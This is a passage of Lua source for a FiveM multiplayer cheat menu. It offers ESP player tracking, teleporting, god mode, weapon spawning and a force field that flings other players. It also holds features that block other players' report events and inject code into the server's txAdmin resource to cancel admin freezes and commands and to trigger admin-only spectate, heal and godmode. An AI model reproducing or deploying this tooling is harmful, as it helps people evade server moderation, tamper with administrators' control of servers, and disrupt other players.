                             {name = "Tiny Mode", type = "toggle", value = false, onClick = function(state)
                                Menu.TinyEnabled = state
                                if state then
                                    Menu.GiantEnabled = false
                                    Citizen.CreateThread(function()
                                        while Menu.TinyEnabled do
                                            SetPedConfigFlag(PlayerPedId(), 223, true)
                                            SetEntityAlpha(PlayerPedId(), 200, false)
                                            Citizen.Wait(0)
                                        end
                                        SetPedConfigFlag(PlayerPedId(), 223, false)
                                        ResetEntityAlpha(PlayerPedId())
                                        SetPedDefaultComponentVariation(PlayerPedId())
                                    end)
                                end
                                Menu.RegisterFeature("Tiny Mode", state)
                            end},

                            {name = "Tiny Ped", type = "toggle", value = false, onClick = function(state)
                                SetPedConfigFlag(PlayerPedId(), 223, state)
                            end},

                            {name = "Adrenaline Mode", type = "toggle", value = false, onClick = function(state)
                                if state then
                                    SetTimecycleModifier("mp_bull_tasting")
                                    SetTimecycleModifierStrength(0.3)
                                    SetAudioSpecialEffectMode(1)
                                    Menu.SafeExec([[
                                        SetPedMoveRateOverride(PlayerPedId(), 1.5)
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.49)
                                    ]])
                                else
                                    ClearTimecycleModifier()
                                    SetAudioSpecialEffectMode(0)
                                    Menu.SafeExec([[
                                        SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                    ]])
                                end
                            end},

                            {isSeparator = true, separatorText = "Quick Actions"},

                            {name = "Force Field", type = "toggle", value = false, onClick = function(state)
                                Menu.ForceFieldEnabled = state
                                Menu.RegisterFeature("Force Field", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.ForceFieldEnabled do
                                            local myC = GetEntityCoords(PlayerPedId())
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local tp = GetPlayerPed(pid)
                                                if tp ~= PlayerPedId() and DoesEntityExist(tp) then
                                                    local tc = GetEntityCoords(tp)
                                                    local dist = #(myC - tc)
                                                    if dist < 10.0 then
                                                        local dir = tc - myC
                                                        local force = (10.0 - dist) * 3.0
                                                        SetEntityVelocity(tp, dir.x * force, dir.y * force, dir.z * force + 5.0)
                                                    end
                                                end
                                            end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},

                            {name = "Smoke Trail", type = "toggle", value = false, onClick = function(state)
                                Menu.SmokeTrailEnabled = state
                                Menu.RegisterFeature("Smoke Trail", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        RequestNamedPtfxAsset("core")
                                        while not HasNamedPtfxAssetLoaded("core") do Citizen.Wait(10) end
                                        while Menu.SmokeTrailEnabled do
                                            local c = GetEntityCoords(PlayerPedId())
                                            UseParticleFxAssetNextCall("core")
                                            StartParticleFxNonLoopedAtCoord("ent_amb_smoke_foundry", c.x, c.y, c.z, 0.0, 0.0, 0.0, 1.0, false, false, false)
                                            Citizen.Wait(50)
                                        end
                                    end)
                                end
                            end},

                            {name = "Dash", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local c = GetEntityCoords(ped)
                                local r = GetGameplayCamRot(2)
                                local fv = vector3(
                                    -math.sin(math.rad(r.z)) * math.cos(math.rad(r.x)),
                                    math.cos(math.rad(r.z)) * math.cos(math.rad(r.x)),
                                    math.sin(math.rad(r.x))
                                )
                                SetEntityCoordsNoOffset(ped, c.x + fv.x * 15, c.y + fv.y * 15, c.z + fv.z * 15, false, false, false)
                                StartScreenEffect("RaceTurbo", 300, false)
                                Menu.Toast("DASH!", "blue")
                            end},

                            {name = "Fake Death", type = "action", onClick = function()
                                local p = PlayerPedId()
                                SetPedToRagdoll(p, 5000, 5000, 0, false, false, false)
                                SetEntityInvincible(p, true)
                                Citizen.Wait(5000)
                                ClearPedTasksImmediately(p)
                                SetEntityInvincible(p, false)
                                Menu.Toast("Fake death done", "blue")
                            end},

                            {name = "Auto Revive", type = "toggle", value = false, onClick = function(state)
                                Menu.AutoReviveEnabled = state
                                Menu.RegisterFeature("Auto Revive", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AutoReviveEnabled do
                                            local p = PlayerPedId()
                                            if IsEntityDead(p) or GetEntityHealth(p) <= 100 then
                                                NetworkResurrectLocalPlayer(GetEntityCoords(p).x, GetEntityCoords(p).y, GetEntityCoords(p).z, GetEntityHeading(p), true, false)
                                                SetEntityHealth(p, GetEntityMaxHealth(p))
                                                SetPedArmour(p, 100)
                                                ClearPedBloodDamage(p)
                                                Menu.Toast("Auto Revived!", "green")
                                            end
                                            Citizen.Wait(500)
                                        end
                                    end)
                                end
                            end},

                            {name = "Anti AFK", type = "toggle", value = false, onClick = function(state)
                                Menu.AntiAFKEnabled = state
                                Menu.RegisterFeature("Anti AFK", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.AntiAFKEnabled do
                                            ResetPlayerStamina(PlayerId())
                                            RestorePlayerStamina(PlayerId(), 1.0)
                                            SetControlNormal(0, 249, 1.0)
                                            Citizen.Wait(30000)
                                        end
                                    end)
                                end
                            end},

                            {name = "Anti Report", type = "toggle", value = false, onClick = function(state)
                                Menu.AntiReportEnabled = state
                                Menu.RegisterFeature("Anti Report", state)
                                if state then
                                    Menu.AntiReportHandlers = {}
                                    local events = {
                                        "qb-admin:server:report",
                                        "esx:report",
                                        "admin:report",
                                        "report:sendReport",
                                        "qb-admin:client:SendReport",
                                    }
                                    for _, ev in ipairs(events) do
                                        local h = AddEventHandler(ev, function() CancelEvent() end)
                                        table.insert(Menu.AntiReportHandlers, h)
                                    end
                                else
                                    if Menu.AntiReportHandlers then
                                        for _, h in ipairs(Menu.AntiReportHandlers) do RemoveEventHandler(h) end
                                        Menu.AntiReportHandlers = nil
                                    end
                                end
                            end},

                            {isSeparator = true, separatorText = "Target Actions"},

                            {name = "Health/Armor HUD", type = "toggle", value = false, onClick = function(state)
                                Menu.HealthHUDEnabled = state
                                if not state then return end
                                Citizen.CreateThread(function()
                                    local smoothHp = 100.0
                                    local smoothArmor = 100.0
                                    while Menu.HealthHUDEnabled do
                                        Citizen.Wait(0)
                                        local ped = PlayerPedId()
                                        local hp = GetEntityHealth(ped) - 100
                                        local maxHp = GetEntityMaxHealth(ped) - 100
                                        if maxHp <= 0 then maxHp = 100 end
                                        local armor = GetPedArmour(ped)
                                        local hpPct = math.floor((hp / maxHp) * 100)
                                        if hpPct < 0 then hpPct = 0 end
                                        if hpPct > 100 then hpPct = 100 end

                                        -- Smooth interpolation for bar animations
                                        smoothHp = smoothHp + (hpPct - smoothHp) * 0.1
                                        smoothArmor = smoothArmor + (armor - smoothArmor) * 0.1

                                        local timer = GetGameTimer()
                                        local pulse = (math.sin(timer * 0.01) + 1.0) * 0.5

                                        -- HUD Position (Top Right)
                                        local panelX = 0.935
                                        local panelY = 0.045
                                        local panelW = 0.11
                                        local panelH = 0.05
                                        local barW = 0.07
                                        local barH = 0.007
                                        local barStartX = panelX - barW / 2 + 0.006

                                        -- Translucent dark panel background
                                        DrawRect(panelX, panelY, panelW, panelH, 12, 16, 26, 230)
                                        -- Left accent border outline (HeaderPink color)
                                        local accR, accG, accB = Menu.Colors.SelectedBg.r, Menu.Colors.SelectedBg.g, Menu.Colors.SelectedBg.b
                                        DrawRect(panelX - panelW / 2 + 0.001, panelY, 0.002, panelH, accR, accG, accB, 255)

                                        -- === HEALTH BAR ===
                                        local hpBarY = panelY - 0.010
                                        -- Bar background (empty track)
                                        DrawRect(barStartX + barW / 2, hpBarY, barW, barH, 20, 20, 25, 255)

                                        -- Health color gradient
                                        local hpR, hpG, hpB = 46, 204, 113 -- Emerald green
                                        if hpPct < 25 then
                                            local flash = pulse > 0.5
                                            hpR, hpG, hpB = flash and 231 or 150, flash and 76 or 30, flash and 60 or 30 -- Pulsing red
                                        elseif hpPct < 50 then
                                            hpR, hpG, hpB = 241, 196, 15 -- Flat sunflower yellow
                                        elseif hpPct < 75 then
                                            hpR, hpG, hpB = 230, 126, 34 -- Carrot orange
                                        end

                                        local hpFill = (smoothHp / 100) * barW
                                        if hpFill > 0.0005 then
                                            DrawRect(barStartX + hpFill / 2, hpBarY, hpFill, barH, hpR, hpG, hpB, 240)
                                        end

                                        -- Health text label
                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.22)
                                        SetTextColour(255, 255, 255, 240)
                                        SetTextEntry("STRING")
                                        AddTextComponentString("HP")
                                        DrawText(panelX - panelW / 2 + 0.006, hpBarY - 0.007)

                                        -- Health percentage
                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.22)
                                        SetTextColour(hpR, hpG, hpB, 255)
                                        SetTextJustification(2)
                                        SetTextWrap(0.0, barStartX + barW + 0.003)
                                        SetTextEntry("STRING")
                                        AddTextComponentString(hpPct .. "%")
                                        DrawText(barStartX + barW + 0.003, hpBarY - 0.007)

                                        -- === ARMOR BAR ===
                                        local arBarY = panelY + 0.010
                                        -- Bar background
                                        DrawRect(barStartX + barW / 2, arBarY, barW, barH, 20, 20, 25, 255)

                                        local arR, arG, arB = 52, 152, 219 -- Peter River Blue
                                        if armor < 25 then
                                            arR, arG, arB = 41, 128, 185
                                        elseif armor > 75 then
                                            arR, arG, arB = 26, 188, 156 -- Turquoise
                                        end

                                        local arFill = (smoothArmor / 100) * barW
                                        if arFill > 0.0005 then
                                            DrawRect(barStartX + arFill / 2, arBarY, arFill, barH, arR, arG, arB, 240)
                                        end

                                        -- Armor text label
                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.22)
                                        SetTextColour(255, 255, 255, 240)
                                        SetTextEntry("STRING")
                                        AddTextComponentString("AP")
                                        DrawText(panelX - panelW / 2 + 0.006, arBarY - 0.007)

                                        -- Armor percentage
                                        SetTextFont(4)
                                        SetTextScale(0.0, 0.22)
                                        SetTextColour(arR, arG, arB, 255)
                                        SetTextJustification(2)
                                        SetTextWrap(0.0, barStartX + barW + 0.003)
                                        SetTextEntry("STRING")
                                        AddTextComponentString(armor .. "%")
                                        DrawText(barStartX + barW + 0.003, arBarY - 0.007)
                                    end
                                end)
                            end},

                            {isSeparator = true, separatorText = "Health & Armor"},

                            {name = "Health Slider", type = "slider", min = 0, max = 200, step = 10, value = 200, onClick = function(sel, val)
                                SetEntityHealth(PlayerPedId(), val)
                                Menu.Toast("Health set to " .. val, "green")
                            end},

                            {name = "Armour Slider", type = "slider", min = 0, max = 100, step = 10, value = 100, onClick = function(sel, val)
                                SetPedArmour(PlayerPedId(), val)
                                Menu.Toast("Armour set to " .. val, "green")
                            end},


                            {isSeparator = true, separatorText = "txAdmin Options"},

                            {name = "txAdmin Player IDs", type = "toggle", value = false, onClick = function(state)
                                Menu.txAdminPlayerIDs = state
                                Menu.RegisterFeature("txAdmin Player IDs", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.txAdminPlayerIDs do
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local ped = GetPlayerPed(pid)
                                                if DoesEntityExist(ped) then
                                                    local coords = GetEntityCoords(ped)
                                                    local name = GetPlayerName(pid)
                                                    local dist = #(GetEntityCoords(PlayerPedId()) - coords)
                                                    if dist < 100.0 then
                                                        local onScreen, sx, sy = GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z + 1.0)
                                                        if onScreen then
                                                            SetTextFont(0) SetTextScale(0.0, 0.3) SetTextColour(255,255,255,255)
                                                            SetTextOutline() SetTextCentre(true)
                                                            BeginTextCommandDisplayText("STRING")
                                                            AddTextComponentSubstringPlayerName("[" .. pid .. "] " .. (name or ""))
                                                            EndTextCommandDisplayText(sx, sy)
                                                        end
                                                    end
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},


                            {name = "Disable All txAdmin", type = "toggle", value = false, onClick = function(state)
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("monitor", state and [[
                                        _G.txDisableAll = true
                                        RegisterNetEvent('txAdmin:receiveCommand') AddEventHandler('txAdmin:receiveCommand', function() CancelEvent() end)
                                    ]] or [[ _G.txDisableAll = false ]]) end)
                                    Menu.Toast("Disable txAdmin: " .. (state and "ON" or "OFF"), "red")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "Disable txAdmin Teleport", type = "toggle", value = false, onClick = function(state)
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("monitor", state and [[
                                        RegisterNetEvent('txcl:setAdmin') AddEventHandler('txcl:setAdmin', function() CancelEvent() end)
                                    ]] or [[]]) end)
                                    Menu.Toast("Disable txAdmin TP: " .. (state and "ON" or "OFF"), "red")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "Disable txAdmin Freeze", type = "toggle", value = false, onClick = function(state)
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("monitor", state and [[
                                        RegisterNetEvent('txAdmin:freezePlayer') AddEventHandler('txAdmin:freezePlayer', function() CancelEvent() end)
                                    ]] or [[]]) end)
                                    Menu.Toast("Disable txAdmin Freeze: " .. (state and "ON" or "OFF"), "red")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                            {name = "txAdmin Spectate", type = "action", onClick = function()
                                Menu.OpenInput("Spectate", "Enter Player ID:", function(id)
                                    if not id or id == "" then return end
                                    local targetId = tonumber(id)
                                    if not targetId then Menu.Toast("Invalid ID!", "red") return end
                                    if Susano and Susano.InjectResource then
                                        pcall(function() Susano.InjectResource("monitor", string.format([[
                                            menuIsAccessible = true
                                            local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            if targetPed and DoesEntityExist(targetPed) then
                                                local targetCoords = GetEntityCoords(targetPed)
                                                TriggerEvent('txcl:spectate:start', %d, targetCoords)
                                            end
                                        ]], targetId, targetId)) end)
                                        Menu.Toast("Spectating ID: " .. targetId, "blue")
                                    else Menu.Toast("Susano unavailable!", "red") end
                                end)
                            end},

                            {name = "txAdmin Heal", type = "action", onClick = function()
                                Menu.OpenInput("Heal", "Enter Player ID (0 = self):", function(id)
                                    if not id or id == "" then return end
                                    local targetId = tonumber(id)
                                    if not targetId then Menu.Toast("Invalid ID!", "red") return end
                                    if Susano and Susano.InjectResource then
                                        pcall(function() Susano.InjectResource("monitor", string.format([[
                                            menuIsAccessible = true
                                            TriggerEvent('txcl:heal', %d)
                                        ]], targetId)) end)
                                        Menu.Toast("Healed ID: " .. targetId, "green")
                                    else Menu.Toast("Susano unavailable!", "red") end
                                end)
                            end},


                            {name = "txAdmin TP to Waypoint", type = "action", onClick = function()
                                if Susano and Susano.InjectResource then
                                    pcall(function() Susano.InjectResource("monitor", [[
                                        menuIsAccessible = true
                                        TriggerEvent('txcl:tpToWaypoint')
                                    ]]) end)
                                    Menu.Toast("Teleported to Waypoint!", "green")
                                else Menu.Toast("Susano unavailable!", "red") end
                            end},

                             {name = "txAdmin Godmode", type = "toggle", value = false, onClick = function(state)
                                 if Susano and Susano.InjectResource then
                                     pcall(function() Susano.InjectResource("monitor", string.format([[
                                         menuIsAccessible = true
                                         TriggerEvent('txcl:setPlayerMode', "godmode", %s)
                                         if not %s then
                                             TriggerEvent('txcl:setPlayerMode', "none")
                                         end
                                     ]], state and "true" or "false", state and "true" or "false")) end)
                                     Menu.Toast("txAdmin Godmode: " .. (state and "ON" or "OFF"), "green")
                                     if not state then
                                         local ped = PlayerPedId()
                                         SetEntityInvincible(ped, false)
                                         SetPlayerInvincible(PlayerId(), false)
                                         SetEntityCanBeDamaged(ped, true)
                                         SetEntityProofs(ped, false, false, false, false, false, false, false, false)
                                     end
                                 else Menu.Toast("Susano unavailable!", "red") end
                             end},

                                                    {name = "Active Features HUD", type = "toggle", value = false, onClick = function(state)
                                Menu.ShowActiveHUD = state
                                Menu.Toast(state and "Active HUD ON" or "Active HUD OFF", state and "green" or "red")
                            end},
                                                    {name = "Spectator Detection", type = "toggle", value = false, onClick = function(state)
                                Menu.ShowSpectators = state
                                Menu.Toast(state and "Spectator HUD ON" or "Spectator HUD OFF", state and "green" or "red")
                            end},
                        }
                    },
                    {
                        name = "Movement",
                        items = {
                            {name = "ESP (Players)", type = "toggle", value = false, onClick = function(state)
                                Menu.ESPEnabled = state
                                Menu.RegisterFeature("ESP", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.ESPEnabled do
                                            local myPed = PlayerPedId()
                                            local myC = GetEntityCoords(myPed)
                                            for _, pid in ipairs(GetActivePlayers()) do
                                                local tPed = GetPlayerPed(pid)
                                                if tPed ~= myPed and DoesEntityExist(tPed) then
                                                    local tc = GetEntityCoords(tPed)
                                                    local dist = #(myC - tc)
                                                    local hp = GetEntityHealth(tPed) - 100
                                                    DrawLine(myC.x, myC.y, myC.z, tc.x, tc.y, tc.z, 255, 0, 0, 200)
                                                    local onScreen, sx, sy = World3dToScreen2d(tc.x, tc.y, tc.z + 1.0)
                                                    if onScreen then
                                                        SetTextFont(4)
                                                        SetTextScale(0.0, 0.3)
                                                        SetTextColour(255, 255, 255, 240)
                                                        SetTextOutline()
                                                        SetTextCentre(true)
                                                        SetTextEntry("STRING")
                                                        AddTextComponentString(GetPlayerName(pid) .. " [" .. math.floor(dist) .. "m] HP:" .. hp)
                                                        DrawText(sx, sy)
                                                    end
                                                end
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {name = "Fast Swim", type = "toggle", value = false, onClick = function(state)
                                Menu.SafeExec(string.format([[SetSwimMultiplierForPlayer(PlayerId(), %f)]], state and 5.0 or 1.0))
                            end},

                            {name = "No Ragdoll", type = "toggle", value = false, onClick = function(state)
                                Menu.SafeExec(string.format([[
                                    local p = PlayerPedId()
                                    SetPedCanRagdoll(p, %s)
                                    SetPedCanRagdollFromPlayerImpact(p, %s)
                                    SetPedCanBeKnockedOffVehicle(p, %d)
                                ]], not state and "true" or "false", not state and "true" or "false", state and 1 or 0))
                            end},

                            {name = "Drunk Mode", type = "toggle", value = false, onClick = function(state)
                                Menu.DrunkModeEnabled = state
                                if state then
                                    SetPedIsDrunk(PlayerPedId(), true)
                                    RequestAnimSet("move_m@drunk@verydrunk")
                                    while not HasAnimSetLoaded("move_m@drunk@verydrunk") do Citizen.Wait(10) end
                                    SetPedMovementClipset(PlayerPedId(), "move_m@drunk@verydrunk", 1.0)
                                    SetTimecycleModifier("spectator5")
                                    SetTimecycleModifierStrength(0.5)
                                else
                                    SetPedIsDrunk(PlayerPedId(), false)
                                    ResetPedMovementClipset(PlayerPedId(), 0.0)
                                    ClearTimecycleModifier()
                                end
                            end},

                            {isSeparator = true, separatorText = "Teleport"},

                            {name = "TP to Waypoint", type = "action", onClick = function()
                                if IsWaypointActive() then
                                    local wp = GetBlipInfoIdCoord(GetFirstBlipInfoId(8))
                                    local found, z = false, 0.0
                                    for height = 1, 1000 do
                                        SetEntityCoordsNoOffset(PlayerPedId(), wp.x, wp.y, height + 0.0, false, false, false)
                                        Citizen.Wait(10)
                                        local success, groundZ = GetGroundZFor_3dCoord(wp.x, wp.y, height + 0.0, false)
                                        if success then
                                            z = groundZ
                                            found = true
                                            break
                                        end
                                    end
                                    if found then
                                        SetEntityCoordsNoOffset(PlayerPedId(), wp.x, wp.y, z + 1.0, false, false, false)
                                    else
                                        SetEntityCoordsNoOffset(PlayerPedId(), wp.x, wp.y, 200.0, false, false, false)
                                    end
                                end
                            end},

                            {name = "TP Forward 50m", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                local c = GetEntityCoords(ped)
                                local h = GetEntityHeading(ped)
                                local rad = h * math.pi / 180.0
                                SetEntityCoordsNoOffset(ped, c.x - math.sin(rad) * 50.0, c.y + math.cos(rad) * 50.0, c.z, false, false, false)
                            end},

                            {name = "Freeze Position", type = "toggle", value = false, onClick = function(state)
                                FreezeEntityPosition(PlayerPedId(), state)
                            end},

                            {name = "Jetpack (q)", type = "toggle", value = false, onClick = function(state)
                                Menu.JetpackEnabled = state
                                Menu.RegisterFeature("Jetpack", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.JetpackEnabled do
                                            if IsControlPressed(0, 44) then -- Q
                                                local ped = PlayerPedId()
                                                ApplyForceToEntity(ped, 1, 0.0, 0.0, 8.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)
                                                local c = GetEntityCoords(ped)
                                                UseParticleFxAssetNextCall("core")
                                                StartParticleFxNonLoopedAtCoord("ent_sht_flame", c.x, c.y, c.z - 1.0, 0.0, 0.0, 0.0, 0.5, false, false, false)
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end)
                                end
                            end},

                            {isSeparator = true, separatorText = "Modes"},

                            {name = "Underground", type = "toggle", value = false, onClick = function(state)
                                local p = PlayerPedId()
                                if state then
                                    SetEntityCollision(p, false, false)
                                    SetEntityAlpha(p, 100, false)
                                else
                                    SetEntityCollision(p, true, true)
                                    ResetEntityAlpha(p)
                                end
                                Menu.RegisterFeature("Underground", state)
                            end},

                            {name = "Matrix Dodge", type = "toggle", value = false, onClick = function(state)
                                if state then
                                    SetTimecycleModifier("NG_blackout")
                                    SetTimecycleModifierStrength(0.5)
                                    SetTimeScale(0.3)
                                else
                                    ClearTimecycleModifier()
                                    SetTimeScale(1.0)
                                end
                                Menu.RegisterFeature("Matrix Dodge", state)
                            end},

                            {name = "Fast Regen", type = "toggle", value = false, onClick = function(state)
                                Menu.FastRegenEnabled = state
                                Menu.RegisterFeature("Fast Regen", state)
                                if state then
                                    Citizen.CreateThread(function()
                                        while Menu.FastRegenEnabled do
                                            local p = PlayerPedId()
                                            local hp = GetEntityHealth(p)
                                            local max = GetEntityMaxHealth(p)
                                            if hp < max then SetEntityHealth(p, math.min(hp + 5, max)) end
                                            Citizen.Wait(100)
                                        end
                                    end)
                                end
                            end},
                        }
                    },
                    {
                        name = "Appearance",
                        items = {
                            {name = "Random Outfit", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                for comp = 0, 11 do
                                    local maxDraw = GetNumberOfPedDrawableVariations(ped, comp)
                                    if maxDraw > 0 then
                                        local draw = math.random(0, maxDraw - 1)
                                        local maxTex = GetNumberOfPedTextureVariations(ped, comp, draw)
                                        local tex = 0
                                        if maxTex > 0 then tex = math.random(0, maxTex - 1) end
                                        SetPedComponentVariation(ped, comp, draw, tex, 2)
                                    end
                                end
                            end},

                            {name = "Save Outfit 1", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                Menu.SavedOutfit1 = {}
                                for comp = 0, 11 do
                                    Menu.SavedOutfit1[comp] = {
                                        draw = GetPedDrawableVariation(ped, comp),
                                        tex = GetPedTextureVariation(ped, comp)
                                    }
                                end
                            end},

                            {name = "Load Outfit 1", type = "action", onClick = function()
                                if not Menu.SavedOutfit1 then return end
                                local ped = PlayerPedId()
                                for comp = 0, 11 do
                                    if Menu.SavedOutfit1[comp] then
                                        SetPedComponentVariation(ped, comp, Menu.SavedOutfit1[comp].draw, Menu.SavedOutfit1[comp].tex, 2)
                                    end
                                end
                            end},

                            {name = "Save Outfit 2", type = "action", onClick = function()
                                local ped = PlayerPedId()
                                Menu.SavedOutfit2 = {}
                                for comp = 0, 11 do
                                    Menu.SavedOutfit2[comp] = {
                                        draw = GetPedDrawableVariation(ped, comp),
                                        tex = GetPedTextureVariation(ped, comp)
                                    }
                                end
                            end},

                            {name = "Load Outfit 2", type = "action", onClick = function()
                                if not Menu.SavedOutfit2 then return end
                                local ped = PlayerPedId()
                                for comp = 0, 11 do
                                    if Menu.SavedOutfit2[comp] then
                                        SetPedComponentVariation(ped, comp, Menu.SavedOutfit2[comp].draw, Menu.SavedOutfit2[comp].tex, 2)
                                    end
                                end
                            end},
                        }
                    }
                }
            },

            {
                name = "PHOENIX",
                hasTabs = true,
                tabs = {
                    {
                        name = "Self",
                        items = {
                            {name = "Clear Screen Effects", type = "action", onClick = function()
                                AnimpostfxStopAll() ClearTimecycleModifier()
                            end},
                            {name = "Force Ragdoll", type = "action", onClick = function()
                                SetPedToRagdoll(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end},
                            {name = "Clear Tasks", type = "action", onClick = function()
                                ClearPedTasks(PlayerPedId())
                            end},

                            {isSeparator = true, separatorText = "Toggles"},
                            {name = "No Ragdoll", type = "toggle", value = false, onClick = function(state)
                                Menu.PhxNoRagdoll = state
                                if state then Citizen.CreateThread(function()
                                    while Menu.PhxNoRagdoll do SetPedCanRagdoll(PlayerPedId(), false) SetPedCanRagdollFromPlayerImpact(PlayerPedId(), false) Citizen.Wait(0) end
                                    SetPedCanRagdoll(PlayerPedId(), true)
                                end) end
                            end},
                            {name = "Anti-Freeze", type = "toggle", value = false, onClick = function(state)
                                Menu.PhxAntiFreeze = state
                                if state then Citizen.CreateThread(function()
                                    while Menu.PhxAntiFreeze do
                                        if IsEntityPositionFrozen(PlayerPedId()) then FreezeEntityPosition(PlayerPedId(), false) ClearPedTasksImmediately(PlayerPedId()) end
                                        Citizen.Wait(100)
                                    end
                                end) end
                            end},
                            {isSeparator = true, separatorText = "txAdmin Options"},
                            {isSeparator = true, separatorText = "Wardrobe"},
                        }
                    },
                    {
                        name = "Weapon",
                        items = {
                            {isSeparator = true, separatorText = "Spawner"},
                            {name = "Give All Weapons", type = "action", onClick = function()
                                local w = {"WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_MARKSMANRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_COMBATMG","WEAPON_MG","WEAPON_MINIGUN","WEAPON_RPG","WEAPON_GRENADELAUNCHER","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_MOLOTOV","WEAPON_KNIFE","WEAPON_MACHETE","WEAPON_BAT"}
                                for _, v in ipairs(w) do GiveWeaponToPed(PlayerPedId(), GetHashKey(v), 999, false, false) end
                            end},
                            {name = "Remove All Weapons", type = "action", onClick = function()
                                RemoveAllPedWeapons(PlayerPedId(), true)
                            end},

                            {isSeparator = true, separatorText = "Categories"},
                            {name = "Melee", type = "selector", selected = 1, options = {"Knife","Dagger","Bat","Crowbar","Golf Club","Hammer","Hatchet","Machete","Switchblade","Nightstick","Wrench","Pool Cue","Battle Axe"}, onClick = function(sel, val)
                                local m = {["Knife"]="WEAPON_KNIFE",["Dagger"]="WEAPON_DAGGER",["Bat"]="WEAPON_BAT",["Crowbar"]="WEAPON_CROWBAR",["Golf Club"]="WEAPON_GOLFCLUB",["Hammer"]="WEAPON_HAMMER",["Hatchet"]="WEAPON_HATCHET",["Machete"]="WEAPON_MACHETE",["Switchblade"]="WEAPON_SWITCHBLADE",["Nightstick"]="WEAPON_NIGHTSTICK",["Wrench"]="WEAPON_WRENCH",["Pool Cue"]="WEAPON_POOLCUE",["Battle Axe"]="WEAPON_BATTLEAXE"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 1, false, true) end
                            end},
                            {name = "Handguns", type = "selector", selected = 1, options = {"Pistol","Combat Pistol","AP Pistol","Pistol .50","SNS Pistol","Heavy Pistol","Vintage Pistol","Ceramic Pistol","Stun Gun","Flare Gun"}, onClick = function(sel, val)
                                local m = {["Pistol"]="WEAPON_PISTOL",["Combat Pistol"]="WEAPON_COMBATPISTOL",["AP Pistol"]="WEAPON_APPISTOL",["Pistol .50"]="WEAPON_PISTOL50",["SNS Pistol"]="WEAPON_SNSPISTOL",["Heavy Pistol"]="WEAPON_HEAVYPISTOL",["Vintage Pistol"]="WEAPON_VINTAGEPISTOL",["Ceramic Pistol"]="WEAPON_CERAMICPISTOL",["Stun Gun"]="WEAPON_STUNGUN",["Flare Gun"]="WEAPON_FLAREGUN"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "SMGs", type = "selector", selected = 1, options = {"Micro SMG","SMG","Assault SMG","Combat PDW","Mini SMG"}, onClick = function(sel, val)
                                local m = {["Micro SMG"]="WEAPON_MICROSMG",["SMG"]="WEAPON_SMG",["Assault SMG"]="WEAPON_ASSAULTSMG",["Combat PDW"]="WEAPON_COMBATPDW",["Mini SMG"]="WEAPON_MINISMG"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "Rifles", type = "selector", selected = 1, options = {"Assault Rifle","Carbine Rifle","Advanced Rifle","Special Carbine","Bullpup Rifle","Compact Rifle","Military Rifle"}, onClick = function(sel, val)
                                local m = {["Assault Rifle"]="WEAPON_ASSAULTRIFLE",["Carbine Rifle"]="WEAPON_CARBINERIFLE",["Advanced Rifle"]="WEAPON_ADVANCEDRIFLE",["Special Carbine"]="WEAPON_SPECIALCARBINE",["Bullpup Rifle"]="WEAPON_BULLPUPRIFLE",["Compact Rifle"]="WEAPON_COMPACTRIFLE",["Military Rifle"]="WEAPON_MILITARYRIFLE"}
                                if val and m[val] then GiveWeaponToPed(PlayerPedId(), GetHashKey(m[val]), 999, false, true) end
                            end},
                            {name = "Shotguns", type = "selector", selected = 1, options = {"Pump Shotgun","Sawed-Off","Assault Shotgun","Bullpup Shotgun","Heavy Shotgun","Auto Shotgun","Double Barrel"}, onClick = function(sel, val)
